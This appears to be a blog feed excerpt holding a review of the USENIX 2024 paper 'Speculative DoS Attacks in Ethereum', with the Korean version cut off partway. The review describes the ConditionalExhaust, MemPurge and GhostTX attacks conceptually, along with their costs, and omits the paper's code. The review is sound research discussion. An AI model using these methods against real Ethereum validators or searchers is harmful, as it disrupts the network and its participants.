      <description>&lt;h1 id=&quot;1-Introduction&quot;&gt;&lt;a href=&quot;#1-Introduction&quot; class=&quot;headerlink&quot; title=&quot;1. Introduction&quot;&gt;&lt;/a&gt;1. Introduction&lt;/h1&gt;&lt;p&gt;Hello, this is bekim</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p>Hello, this is bekim! I was writing articles related to blockchain when I got a job and became too busy, so I will review some papers! I searched for papers from Usenix Security 24 or 25, and chose topics related to blockchain security, which I have been dealing with on a regular basis. So, I will review the papers assuming that the readers of this article have a basic understanding of blockchain.</p><p><img src="/2025/08/25/bekim/review/en/image.png" alt></p><p>Today&#x2019;s review is on a paper titled <strong>Speculative DoS Attacks in Ethereum</strong>. This paper presents a new form of denial-of-service (DoS) attack that could occur in Ethereum. The researchers demonstrate how three main attack methods <strong>(ConditionalExhaust, MemPurge, and GhostTX)</strong> can exploit Ethereum&#x2019;s transaction processing and resource management structure. All experiments were conducted on the Ethereum testnet.</p><h1 id="2-Paper-Review"><a href="#2-Paper-Review" class="headerlink" title="2. Paper Review"></a>2. Paper Review</h1><p>In my previous research paper <a href="https://hackyboiz.github.io/2025/07/13/bekim/smartcontract/en/">From Paper to Code: Smart Contract</a>&#x201D;, I briefly explained the gas mechanism in the section describing how Ethereum works. If you find this concept difficult to understand, you may want to read it first!</p><h2 id="2-1-Background"><a href="#2-1-Background" class="headerlink" title="2.1 Background"></a>2.1 Background</h2><p>Ethereum primarily utilizes the gas mechanism to prevent excessive computation and provides incentives to nodes (validators) operating the network. When executing a transaction, gas must be paid based on the computational load, and this gas has served as a mechanism to protect network resources. Therefore, until now, there has been a perception that DoS attacks are very difficult on Ethereum.</p><p>However, this paper presents a different perspective.</p><p>Due to the Turing-complete nature of smart contracts, nodes must execute a transaction to verify whether it can actually be included in a block.<br>The costs incurred in this process are not compensated by fees unless the transaction is included in the block. In other words, attackers can create malicious transactions that &#x201C;force work but do not provide compensation.&#x201D;</p><p>The paper introduces three new attack techniques to demonstrate this.</p><ul><li><strong>ConditionalExhaust</strong>: A resource exhaustion attack that occurs only under specific conditions.</li><li><strong>MemPurge:</strong> An attack that forces normal transactions out of the validator/builder&#x2019;s mempool.</li><li><strong>GhostTX:</strong> An attack that disrupts the reputation system of Ethereum&#x2019;s PBS (Proposer-Builder Separation) ecosystem.</li></ul><p>In particular, using ConditionalExhaust and Mempurge simultaneously can deplete the computational resources of validators while blocking the mempool, preventing victims from including transactions in blocks. This could result in victims generating empty blocks and threatening the network&#x2019;s activity.</p><h2 id="2-2-Proposed-Attacks"><a href="#2-2-Proposed-Attacks" class="headerlink" title="2.2 Proposed Attacks"></a>2.2 Proposed Attacks</h2><h3 id="2-2-1-The-ConditionalExhaust-Attack"><a href="#2-2-1-The-ConditionalExhaust-Attack" class="headerlink" title="2.2.1 The ConditionalExhaust Attack"></a>2.2.1 The ConditionalExhaust Attack</h3><p>The first attack we will introduce is the ConditionalExhaust attack, a conditional resource depletion attack.</p><p>The core idea of the attack is simple. Validators or block builders following censorship do not include transactions interacting with a specific censored address (&#x3C3;) in the block. This is because, following the 2022 U.S. OFAC (Office of Foreign Assets Control) sanctions against the smart contract address associated with the Tornado Cash mixing service, some Ethereum validators began filtering out transactions related to that address from blocks. The problem is that <strong>to determine whether a transaction is related to a sanctioned entity (&#x3C3;), the transaction must be executed unconditionally</strong>. This execution process is exploited by ConditionalExhaust.</p><p><img src="/2025/08/25/bekim/review/en/image1.png" alt></p><blockquote><p>Complete Overview of Decred&#x2019;s Structure [source: <a href="https://medium.com/decred/blockchain-governance-how-decred-iterates-upon-bitcoin-3cc7030c655e">https://medium.com/decred/blockchain-governance-how-decred-iterates-upon-bitcoin-3cc7030c655e</a>]</p></blockquote><p>Speculative DoS Attacks in Ethereum (USENIX Security 2024): ConditionalExhaust is a conditional REA, in which<br>an attacker creates transactions that invoke computationally complex code if the victim cannot include them in a block, for example due to its censoring policy</p><p>The attack is divided into two main stages.</p><p>First, in the <strong>deployment stage</strong>, the attacker uploads a specially designed smart contract to the blockchain (1).</p><p>This contract contains the following conditions:</p><p>1) If the executor is a censoring validator, perform complex and heavy computations (2). (3)<br>2) If not, it performs simple operations and incurs minimal gas costs.</p><p>This condition is included in the contract.</p><p>Next, in the <strong>execution phase</strong>, the attacker floods the network with multiple transactions calling this contract.</p><p>This causes censors to consume excessive CPU and memory resources for each computation, and only after execution completes do they realize the transaction cannot be included in the block because it interacts with the censored address (&#x3C3;). (4) In other words, resources are wasted without any reward.</p><p>Although there is an implementation overview in the actual paper, I will not include it here due to the possibility of code misuse. Researchers designed the code to maximize resource consumption by modifying various elements, such as Ethereum&#x2019;s storage structure and high-cost opcodes.</p><p>As a result, while it took only microseconds for the attacker to generate and sign transactions, it took an average of 0.1 seconds for the censor to verify them, resulting in a difference of approximately 1,972 times over two hours. In actual Ethereum, a block can process up to 120 transactions in 12 seconds, but if the attacker sends just 140 transactions, it could result in an empty block being generated without including normal transactions.</p><p>The economic cost of the attack was also not significant. Deploying the contract cost $27 (36,000 KRW), and in the worst case, if the attack transactions were included in the block, the cost would be $5.3 (7,000 KRW). Upon actual calculation, the total cost required to execute 140 attack transactions in a single block was only approximately $376 (500,000 KRW).</p><h3 id="2-2-2-The-MemPurge-Attack"><a href="#2-2-2-The-MemPurge-Attack" class="headerlink" title="2.2.2 The MemPurge Attack"></a>2.2.2 The MemPurge Attack</h3><p>The second attack is, as the name suggests, an attack that purges the node&#x2019;s mempool. Ethereum nodes store transactions that may be included in future blocks in a storage called <strong>mempool</strong>, which has limited space, so transactions with higher fees are usually prioritized.</p><p>The attacker exploits this rule to push out profitable legitimate transactions from the mempool and replace them with their own meaningless transactions.<br>The core of the attack is to create a transaction chain (TXchain) with consecutive nonces (numbers).</p><p><img src="/2025/08/25/bekim/review/en/image2.png" alt></p><blockquote><p>Speculative DoS Attacks in Ethereum (USENIX Security 2024): The MemPurge attack lowers the cost to evict transactions from victims&#x2019; mempools.</p></blockquote><p>Speculative DoS Attacks in Ethereum (USENIX Security 2024): The MemPurge attack lowers the cost to evict transactions from victims&#x2019; mempools.</p><p>1) First, the attacker creates the first transaction (nonce=N) to transfer funds from their account to a new address, and then adds meaningless transactions such as Nonce = N+1, N+2, &#x2026; to form a TX Chain. (1)<br>2) The attacker sends subsequent transactions to the victim node (2), and since the victim node receives them without any preceding transactions, it temporarily stores them in the future queue (3).<br>3) Finally, when the attacker sends the first transaction (N), the victim node verifies it and moves the entire previous transaction chain to the pending queue (4).<br>4) However, since the attacker&#x2019;s funds have already been withdrawn in the first transaction, subsequent transactions become invalid due to insufficient balance. As a result, the mempool is filled with meaningless transactions, and the originally profitable transactions are pushed out.</p><ul><li><strong>ConditionalExhaust + MemPurge</strong><br>Mempurge and ConditionalExhaust can be combined. By setting the to address of each MemPurge transaction to ConditionalExhaust, MemPool space is occupied, and ConditionalExhaust consumes computation.</li></ul><p>By calling the ConditionalExhaust contract in the first transaction to impose CPU and memory computation burdens on the censor, and then invalidating subsequent transactions that only occupy mempool space, a more powerful attack can be executed.</p><p>Researchers verified this combined attack and reported that, compared to a single attack, the gas cost remained almost unchanged while maintaining the same effectiveness.</p><h3 id="2-2-3-The-GhostTX-Attack"><a href="#2-2-3-The-GhostTX-Attack" class="headerlink" title="2.2.3 The GhostTX Attack"></a>2.2.3 The GhostTX Attack</h3><p>The GhostTX Attack directly targets the reputation of the Searcher in Flashbots&#x2019; PBS (Proposer-Builder Separation) environment.</p><ul><li><strong>PBS</strong> is a structure that separates the roles of block proposers and builders to efficiently construct blocks. Proposers simply select and submit blocks, while builders create the most profitable transaction combinations (bundles) and submit them to proposers.</li></ul><p><img src="/2025/08/25/bekim/review/en/image3.png" alt></p><blockquote><p>Speculative DoS Attacks in Ethereum (USENIX Security 2024): Overview of Ethereum&#x2019;s PBS ecosystem actors.</p></blockquote><ul><li><strong>Flashbots</strong> is an implementation of PBS, providing a <strong>Relay</strong> service that connects Searchers (participants who create Bundles and deliver them to Builders), Builders, and Proposers. This system has a <strong>Reputation</strong> system that scores Searchers based on their past performance, so Bundles from Searchers with high reputations are selected first.</li></ul><p>Here, reputation is calculated based on <strong>how much profit was generated per gas unit</strong>. Therefore, once reputation drops, the address must be changed to rebuild it, which means attackers can lower the victim&#x2019;s trustworthiness and force them out of the ecosystem.<br>&#x394;T: Amount paid to the Builder, pT: Fee, gT: Gas consumption </p><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">r</span><span class="hljs-params">(U)</span> = <span class="hljs-params">(&#x2211; (&#x394;T + pT * gT)</span>) / <span class="hljs-params">(&#x2211; gT)</span></span></code></pre><p><img src="/2025/08/25/bekim/review/en/image4.png" alt></p><blockquote><p>Speculative DoS Attacks in Ethereum (USENIX Security 2024): GhostTX&#x2019;s censorship variant exploits an inconsistency between builder and relay censorship methods</p></blockquote><p>The attack process is divided into <strong>two types (Proposer Variant, Non-proposer Variant)</strong>. Simply put, in the <strong>Proposer Variant</strong>, if the attacker is a block proposer, they spread a bait transaction that appears to be profitable and then invalidate it in the first block to damage the Searcher&#x2019;s reputation.</p><p>In the case of the <strong>Non-Proposer</strong>, the attacker simultaneously spreads a collision transaction with the same nonce and fee as the Searcher&#x2019;s bait transaction, ensuring that only the attacker&#x2019;s transaction is recorded in the block.</p><p>1) The attacker sends a transaction that transfers funds to a sanctioned address (1)<br>2) The Searcher identifies this as a profitable transaction and includes it in the bundle. (2)<br>3) The Builder verifies the bundle (3) and adds the TX to the block (4).<br>4) The block is transmitted to the Relay, but the Relay detects the transaction related to the sanctioned address and discards the block (5), resulting in the Searcher&#x2019;s bundle being invalidated and their Reputation score decreasing. (6)</p><p>The GhostTX Attack can be executed in various ways, one of which is the <strong>Censorship Variant</strong>. This exploits the subtle differences in how Flashbots&#x2019; Builder and Relay perform censorship.</p><p>While Builder&#x2019;s internal verification does not consider 0 ETH transfers using the call operator as sanction targets, Relay&#x2019;s verification API does consider them as such. Attackers can exploit this by creating transactions that send 0 ETH to sanctioned addresses, making them appear as normal transactions to Searcher and Builder, but only getting filtered out at the Relay stage. This results in Searcher&#x2019;s bundles being invalidated again and its Reputation score decreasing.</p><p><img src="/2025/08/25/bekim/review/en/image5.png" alt></p><blockquote><p>Speculative DoS Attacks in Ethereum (USENIX Security 2024): Figure 8: Cost of attacking average searchers with GhostTX</p></blockquote><p>The researchers evaluated the effectiveness of GhostTX attacks based on actual data. For top-tier Searchers, they were generating approximately 8,240 ETH in profits and 112 billion gas usage. To push them out of the top 50% in Reputation, it would require a cost of approximately 42.49 million dollars. While it is practically impossible to realistically bring down established large-scale Searchers, the results were different for average-level Searchers.</p><p>On average, they recorded approximately 0.95 ETH in profits, 3.28 million gas usage, and a Reputation score of 2.9&#xD7;10&#xB9;&#xB9;. It was reported that only 9,820 dollars would be sufficient to push them down to the bottom 60% level. In other words, while the GhostTX attack is difficult to execute against large Searchers, it can relatively cheaply undermine the Reputation of medium-sized Searchers or newly entering Searchers.</p><h1 id="3-Conclusion"><a href="#3-Conclusion" class="headerlink" title="3. Conclusion"></a>3. Conclusion</h1><p>As the authors of the paper also pointed out, there are several practical constraints that prevent the proposed attacks from being directly applied in real-world environments. For example, ConditionalExhaust requires the attacker to spread a large number of transactions simultaneously to maximize its effectiveness, which could incur significant network layer costs in practice. Additionally, there may be discrepancies between the attack costs mentioned in the paper and actual attack costs, leading to varying assessments of the threat level depending on the environment.</p><p>Personally, I wonder how realistic a threat this could be on the mainnet. ConditionalExhaust and MemPurge seem impractical for threatening the mainnet, while GhostTX appears to be a more feasible attack in reality&#x2026;</p><p>The paper does propose mitigations for these attacks, but upon reading them, most seem to either degrade user experience or reduce network efficiency, so they are not yet perfect solutions. In conclusion, while these attacks may not pose an immediate, substantial threat capable of destabilizing the mainnet, the paper does highlight some structural vulnerabilities in Ethereum&#x2019;s architecture.</p><p>Thank you for reading this sudden paper review all the way through! &#x1F64F; I&#x2019;ll be back soon with more interesting topics.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/review/">review</category>
      
      <category domain="https://hackyboiz.github.io/tags/blockchain/">blockchain</category>
      
      <category domain="https://hackyboiz.github.io/tags/ethereum/">ethereum</category>
      
      <category domain="https://hackyboiz.github.io/tags/usenix/">usenix</category>
      
      <category domain="https://hackyboiz.github.io/tags/Dos/">Dos</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/25/bekim/review/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Paper Review (USENIX ’24) Speculative DoS Attacks in Ethereum (ko)</title>
      <link>https://hackyboiz.github.io/2025/08/25/bekim/review/ko/</link>
      <guid>https://hackyboiz.github.io/2025/08/25/bekim/review/ko/</guid>
      <pubDate>Mon, 25 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;1-&amp;#xC11C;&amp;#xB860;&quot;&gt;&lt;a href=&quot;#1-&amp;#xC11C;&amp;#xB860;&quot; class=&quot;headerlink&quot; title=&quot;1. &amp;#xC11C;&amp;#xB860;&quot;&gt;&lt;/a&gt;1. &amp;#xC11C;&amp;#xB860;&lt;/h1&gt;&lt;p&gt;&amp;#xC</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1-&#xC11C;&#xB860;"><a href="#1-&#xC11C;&#xB860;" class="headerlink" title="1. &#xC11C;&#xB860;"></a>1. &#xC11C;&#xB860;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; bekim&#xC785;&#xB2C8;&#xB2E4;! &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xAD00;&#xB828; &#xAE00;&#xC744; &#xC4F0;&#xB2E4;&#xAC00; &#xCDE8;&#xC9C1;&#xC744; &#xD558;&#xAC8C;&#xB418;&#xC5B4; &#xB108;&#xBB34; &#xBC14;&#xBE60;&#xC9C4; &#xAD00;&#xACC4;&#xB85C; &#xB17C;&#xBB38; &#xB9AC;&#xBDF0;&#xB97C; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! Usenix security 24, 25&#xB144;&#xB3C4; &#xB17C;&#xBB38;&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xCC3E;&#xC558;&#xB294;&#xB370; &#xC81C;&#xAC00; &#xD3C9;&#xC18C;&#xC5D0; &#xB2E4;&#xB904;&#xC654;&#xB358; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xBCF4;&#xC548;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xC8FC;&#xC81C;&#xB97C; &#xD0DD;&#xD588;&#xC5B4;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xC774; &#xAE00;&#xC744; &#xC77D;&#xB294; &#xBD84;&#xB4E4;&#xC774; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC5D0; &#xC54C;&#xACE0;&#xC788;&#xB2E4;&#xB294; &#xC804;&#xC81C; &#xD558;&#xC5D0; &#xB17C;&#xBB38; &#xB9AC;&#xBDF0; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.!</p><p><img src="/2025/08/25/bekim/review/ko/image.png" alt></p><p>&#xC624;&#xB298; &#xB2E4;&#xB8F0; &#xB17C;&#xBB38;&#xC740; Speculative DoS Attacks in Ethereum &#xC774;&#xB77C;&#xB294; &#xB17C;&#xBB38;&#xC774;&#xC5D0;&#xC694;. &#xC774; &#xB17C;&#xBB38;&#xC740; &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xD615;&#xD0DC;&#xC758; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80;(DoS) &#xACF5;&#xACA9;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC694;. researcher&#xB4E4;&#xC740; 3&#xAC00;&#xC9C0; &#xC8FC;&#xC694; &#xACF5;&#xACA9; &#xBCA1;&#xD130;(ConditionalExhaust, MemPurge, GhostTX)&#xB4E4;&#xC744; &#xC81C;&#xC2DC;&#xD558;&#xBA70;, &#xAC01;&#xAC01;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC758; transaction &#xCC98;&#xB9AC;&#xC640; &#xC790;&#xC6D0; &#xAD00;&#xB9AC; &#xAD6C;&#xC870;&#xB97C; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xBCF4;&#xC5EC;&#xC8FC;&#xACE0; &#xC788;&#xC5B4;&#xC694;. &#xC774;&#xC5D0; &#xB530;&#xB978; &#xD14C;&#xC2A4;&#xD2B8;&#xB294; &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC758; &#xD14C;&#xC2A4;&#xD2B8;&#xB137;&#xC5D0;&#xC11C; &#xC9C4;&#xD589;&#xD55C; &#xACB0;&#xACFC;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="2-&#xB17C;&#xBB38;-&#xB9AC;&#xBDF0;"><a href="#2-&#xB17C;&#xBB38;-&#xB9AC;&#xBDF0;" class="headerlink" title="2. &#xB17C;&#xBB38; &#xB9AC;&#xBDF0;"></a>2. &#xB17C;&#xBB38; &#xB9AC;&#xBDF0;</h1><p>&#xC81C;&#xAC00; &#xC774;&#xC804;&#xC5D0; &#xC37C;&#xB358; <a href="https://hackyboiz.github.io/2025/07/13/bekim/smartcontract/ko/">From Paper to Code: Smart Contract</a> &#xC5D0;&#xC11C;  &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC758; &#xB3D9;&#xC791;&#xC744; &#xC124;&#xBA85;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xAC00;&#xC2A4; &#xB9E4;&#xCEE4;&#xB2C8;&#xC998;&#xB3C4; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xD588;&#xC5C8;&#xB294;&#xB370;, &#xD639;&#xC2DC; &#xC774; &#xAC1C;&#xB150;&#xC774; &#xC5B4;&#xB824;&#xC6B0;&#xC2DC;&#xB2E4;&#xBA74; &#xC77D;&#xACE0; &#xC624;&#xC154;&#xB3C4; &#xC88B;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="2-1-Background"><a href="#2-1-Background" class="headerlink" title="2.1 Background"></a>2.1 Background</h2><p>&#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xAC00;&#xC2A4;(gas) &#xB9E4;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xACFC;&#xB3C4;&#xD55C; &#xC5F0;&#xC0B0;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xACE0;, &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xC6B4;&#xC601;&#xD558;&#xB294; &#xB178;&#xB4DC;(&#xAC80;&#xC99D;&#xC790;)&#xB4E4;&#xC5D0;&#xAC8C; &#xC778;&#xC13C;&#xD2F0;&#xBE0C;&#xB85C; &#xC8FC;&#xAE30;&#xB3C4; &#xD574;&#xC694;. &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xB54C;&#xB294; &#xC5F0;&#xC0B0;&#xB7C9;&#xB9CC;&#xD07C; &#xAC00;&#xC2A4;&#xB97C; &#xC9C0;&#xBD88;&#xD574;&#xC57C; &#xD558;&#xACE0;, &#xC774; &#xAC00;&#xC2A4;&#xAC00; &#xBC14;&#xB85C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC790;&#xC6D0;&#xC744; &#xBCF4;&#xD638;&#xD558;&#xB294; &#xC7A5;&#xCE58; &#xC5ED;&#xD560;&#xC744; &#xD574;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0;&#xB294; &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC5D0;&#xC11C; DoS &#xACF5;&#xACA9;&#xC774; &#xB9E4;&#xC6B0; &#xC5B4;&#xB835;&#xB2E4;&#xB294; &#xC778;&#xC2DD;&#xC774; &#xC788;&#xC5C8;&#xC8E0;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; &#xB2E4;&#xB978; &#xC2DC;&#xAC01;&#xC744; &#xC81C;&#xC2DC;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC694;. </p><p>Turing-complete&#xD55C; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758; &#xD2B9;&#xC131; &#xB54C;&#xBB38;&#xC5D0;, &#xC5B4;&#xB5A4; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC774; &#xC2E4;&#xC81C;&#xB85C; &#xBE14;&#xB85D;&#xC5D0; &#xD3EC;&#xD568;&#xB420; &#xC218; &#xC788;&#xB294;&#xC9C0;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB824;&#xBA74; &#xB178;&#xB4DC;&#xAC00; &#xBC18;&#xB4DC;&#xC2DC; &#xADF8; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD574;&#xBD10;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.<br>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBE44;&#xC6A9;&#xC740; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC774; &#xBE14;&#xB85D;&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xC774;&#xC0C1; &#xC218;&#xC218;&#xB8CC;&#xB85C; &#xBCF4;&#xC0C1;&#xB418;&#xC9C0; &#xC54A;&#xC544;&#xC694;. &#xC989;, &#xACF5;&#xACA9;&#xC790;&#xB294; <strong>&#x201C;&#xC791;&#xC5C5;&#xC740; &#xAC15;&#xC81C;&#xB85C; &#xC2DC;&#xD0A4;&#xACE0;, &#xBCF4;&#xC0C1;&#xC740; &#xC8FC;&#xC9C0; &#xC54A;&#xB294;&#x201D;</strong> &#xC545;&#xC131; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;</p><p>&#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB97C; &#xBCF4;&#xC5EC;&#xC8FC;&#xAE30; &#xC704;&#xD574; 3&#xAC00;&#xC9C0; &#xC0C8;&#xB85C;&#xC6B4; &#xACF5;&#xACA9; &#xAE30;&#xBC95;&#xC744; &#xC18C;&#xAC1C;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>ConditionalExhaust</strong>: &#xD2B9;&#xC815; &#xC870;&#xAC74;&#xC5D0;&#xC11C;&#xB9CC; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC790;&#xC6D0; &#xACE0;&#xAC08;(Resource Exhaustion) &#xACF5;&#xACA9;</li><li><strong>MemPurge:</strong> &#xBC38;&#xB9AC;&#xB370;&#xC774;&#xD130;&#xB7;&#xBE4C;&#xB354;&#xC758; mempool&#xC5D0;&#xC11C; &#xC815;&#xC0C1; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xAC15;&#xC81C;&#xB85C; &#xBC00;&#xC5B4;&#xB0B4;&#xB294; &#xACF5;&#xACA9;</li><li><strong>GhostTX:</strong> &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC758; PBS(Proposer-Builder Separation) &#xC0DD;&#xD0DC;&#xACC4;&#xC758; &#xD3C9;&#xD310; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xAD50;&#xB780;&#xD558;&#xB294; &#xACF5;&#xACA9;</li></ul><p>&#xD2B9;&#xD788; ConditionalExhaust&#xC640; Mempurge&#xB97C; &#xB3D9;&#xC2DC;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xBA74;, Validator&#xC758; &#xC5F0;&#xC0B0; &#xC790;&#xC6D0;&#xC744; &#xACE0;&#xAC08;&#xC2DC;&#xD0A4;&#xB294; &#xB3D9;&#xC2DC;&#xC5D0; mempool&#xC744; &#xB9C9;&#xC544;&#xBC84;&#xB824; &#xD53C;&#xD574;&#xC790;&#xAC00; &#xBE14;&#xB85D;&#xC5D0; &#xAC70;&#xB798;&#xB97C; &#xD3EC;&#xD568;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xD53C;&#xD574;&#xC790;&#xAC00; &#xBE48; &#xBE14;&#xB85D;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xAE30; &#xB418;&#xACE0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; &#xD65C;&#xC131;&#xB3C4;&#xB97C; &#xC704;&#xD611;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xACA0;&#xC8E0;..</p><h2 id="2-2-&#xC81C;&#xC548;&#xB41C;-&#xACF5;&#xACA9;"><a href="#2-2-&#xC81C;&#xC548;&#xB41C;-&#xACF5;&#xACA9;" class="headerlink" title="2.2 &#xC81C;&#xC548;&#xB41C; &#xACF5;&#xACA9;"></a>2.2 &#xC81C;&#xC548;&#xB41C; &#xACF5;&#xACA9;</h2><h3 id="2-2-1-The-ConditionalExhaust-Attack"><a href="#2-2-1-The-ConditionalExhaust-Attack" class="headerlink" title="2.2.1 The ConditionalExhaust Attack"></a>2.2.1 The ConditionalExhaust Attack</h3><p>&#xCCAB; &#xBC88;&#xC9F8;&#xB85C; &#xC18C;&#xAC1C;&#xD560; &#xACF5;&#xACA9;&#xC740; ConditionalExhaust&#xB77C;&#xB294; &#xC870;&#xAC74;&#xBD80; &#xC790;&#xC6D0; &#xACE0;&#xAC08; &#xACF5;&#xACA9;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xACF5;&#xACA9;&#xC758; &#xD575;&#xC2EC; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB294; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. &#xAC80;&#xC5F4;(Censorship)&#xC744; &#xB530;&#xB974;&#xB294; Validator&#xB098; &#xBE14;&#xB85D; &#xBE4C;&#xB354;&#xB294;, &#xD2B9;&#xC815; &#xAC80;&#xC5F4; &#xB300;&#xC0C1; &#xC8FC;&#xC18C;(&#x3C3;)&#xC640; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD558;&#xB294; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xBE14;&#xB85D;&#xC5D0; &#xD3EC;&#xD568;&#xC2DC;&#xD0A4;&#xC9C0; &#xC54A;&#xC544;&#xC694;. 2022&#xB144; &#xBBF8;&#xAD6D; OFAC(&#xD574;&#xC678;&#xC790;&#xC0B0;&#xD1B5;&#xC81C;&#xAD6D;)&#xC774; Tornado Cash&#xB77C;&#xB294; &#xBBF9;&#xC11C; &#xC11C;&#xBE44;&#xC2A4; &#xAD00;&#xB828; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8; &#xC8FC;&#xC18C;&#xB97C; &#xC81C;&#xC7AC;&#xD55C; &#xC77C;&#xB85C; &#xC778;&#xD574;, &#xC77C;&#xBD80; &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC758; &#xAC80;&#xC99D;&#xC790;&#xB4E4;&#xC740; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xBE14;&#xB85D;&#xC5D0;&#xC11C; &#xAC78;&#xB7EC;&#xB0B4;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC778;&#xB370;&#xC694;. &#xBB38;&#xC81C;&#xB294; <strong>&#xC5B4;&#xB5A4; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC774; &#xC81C;&#xC7AC; &#xB300;&#xC0C1;(&#x3C3;)&#xACFC; &#xAD00;&#xB828;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xBB34;&#xC870;&#xAC74; &#xC2E4;&#xD589;&#xD574;&#xBD10;&#xC57C; &#xD55C;&#xB2E4;</strong>&#xB294; &#xC810;&#xC774;&#xC5D0;&#xC694;. &#xC774; &#xC2E4;&#xD589; &#xACFC;&#xC815;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xB294; &#xAC8C; ConditionalExhaust&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img 